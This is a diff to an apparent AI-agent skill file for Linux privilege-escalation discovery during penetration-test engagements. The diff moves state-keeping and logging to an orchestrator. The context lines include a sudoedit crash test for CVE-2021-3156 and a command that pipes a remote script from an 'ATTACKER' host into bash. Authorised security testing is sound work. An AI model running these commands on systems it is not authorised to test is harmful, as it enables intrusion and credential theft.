@@ -42,37 +42,16 @@ If unclear, default to guided.
 
 ## Engagement Logging
 
-Check for `./engagement/` directory. If absent:
-- **Guided**: Ask if the user wants to initialize an engagement directory.
-- **Autonomous**: Create it automatically.
+Check for `./engagement/` directory. If absent, proceed without logging.
 
-When an engagement directory exists, log as you work:
-- **Activity** → append to `engagement/activity.md` at milestones:
-  `### [YYYY-MM-DD HH:MM:SS] linux-discovery → <hostname>` with enumeration findings.
-- **Findings** → append to `engagement/findings.md` when a privesc vector is confirmed.
-- **Evidence** → save enumeration output to `engagement/evidence/` (e.g.,
-  `linpeas-output.txt`, `suid-binaries.txt`).
+When an engagement directory exists:
+- Print `[linux-discovery] Activated → <target>` to the screen on activation.
+- **Evidence** → save significant output to `engagement/evidence/` with
+  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).
 
-### Invocation Log
-
-Immediately on activation — before reading state.md or doing any assessment —
-log invocation to both the screen and activity.md:
-
-1. **On-screen**: Print `[linux-discovery] Activated → <target>` so the operator
-   sees which skill is running.
-2. **activity.md**: Append:
-   ```
-   ### [YYYY-MM-DD HH:MM:SS] linux-discovery → <target>
-   - Invoked (assessment starting)
-   ```
-
-**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
-and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
-placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
-with date and second precision for timeline reconstruction.
-
-This entry must be written NOW, not deferred. Subsequent milestone entries
-append bullet points under this same header.
+Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
+engagement state. The orchestrator maintains these files. Report all findings
+in your return summary.
 
 ## Scope Boundary
 
@@ -83,13 +62,10 @@ you reach the boundary of this scope — whether through a routing instruction
 **STOP**.
 
 Do not load or execute another skill. Do not continue past your scope boundary.
-Instead:
-
-1. Write `engagement/state.md` with current findings
-2. Return to the orchestrator with:
-   - What was found (vulns, credentials, access gained)
-   - Recommended next skill (the bold **skill-name** from routing instructions)
-   - Context to pass (injection point, target, working payloads, etc.)
+Instead, return to the orchestrator with:
+  - What was found (vulns, credentials, access gained)
+  - Recommended next skill (the bold **skill-name** from routing instructions)
+  - Context to pass (injection point, target, working payloads, etc.)
 
 The orchestrator decides what runs next. Your job is to execute this skill
 thoroughly and return clean findings.
@@ -101,23 +77,21 @@ The orchestrator will provide specific guidance or route to a different skill.
 
 ## State Management
 
-If `engagement/state.md` exists, read it before starting. Use it to:
-- Skip hosts/vectors already enumerated
-- Leverage existing credentials or access
-- Check what's been tried and failed (Blocked section)
+Call `get_state_summary()` from the state-reader MCP server to read current
+engagement state. Use it to:
+- Skip re-testing targets, parameters, or vulns already confirmed
+- Leverage existing credentials or access for this technique
+- Understand what's been tried and failed (check Blocked section)
 
-Write `engagement/state.md` at these checkpoints (not just at completion):
-1. **After confirming a vulnerability** — add to Vulns with `[found]`
-2. **After successful exploitation** — add credentials, access, pivot paths
-3. **Before routing to another skill** — the next skill reads state.md on activation
-
-At each checkpoint and on completion, update the relevant sections of
-`engagement/state.md`:
-- **Targets**: Add system info (hostname, OS, kernel version, architecture)
-- **Access**: Update current access level (user, service account, root)
-- **Vulns**: Add confirmed privesc vectors as one-liners with `[found]` status
-- **Pivot Map**: Map which vectors lead to which access levels
-- **Blocked**: Record failed enumeration attempts
+**Do NOT write engagement state.** When your work is complete, report all
+findings clearly in your return summary. The orchestrator parses your summary
+and records state changes. Your return summary must include:
+- New targets/hosts discovered (with ports and services)
+- New credentials or tokens found
+- Access gained or changed (user, privilege level, method)
+- Vulnerabilities confirmed (with status and severity)
+- Pivot paths identified (what leads where)
+- Blocked items (what failed and why, whether retryable)
 
 ## Prerequisites
 
@@ -222,7 +196,7 @@ sudoedit -s '\' $(python3 -c 'print("A"*65536)') 2>&1
 # Patched: "usage: sudoedit" error message
 ```
 
-Only mark CVE-2021-3156 as `[found]` in state.md if the test shows a crash or
+Only mark CVE-2021-3156 as `[found]` in the engagement state if the test shows a crash or
 memory error. A "usage:" response means the build is patched regardless of version.
 
 **What to look for in `sudo -l` output:**
@@ -649,10 +623,6 @@ curl -sL https://ATTACKER/linpeas.sh | bash
 ```
 
 ## Step 12: Routing Decision Tree
-
-**Before routing**: Write `engagement/state.md` and append to
-`engagement/activity.md` with results so far. The next skill reads state.md
-on activation — stale state means duplicate work or missed context.
 
 Based on enumeration findings, route to the appropriate technique skill:
 
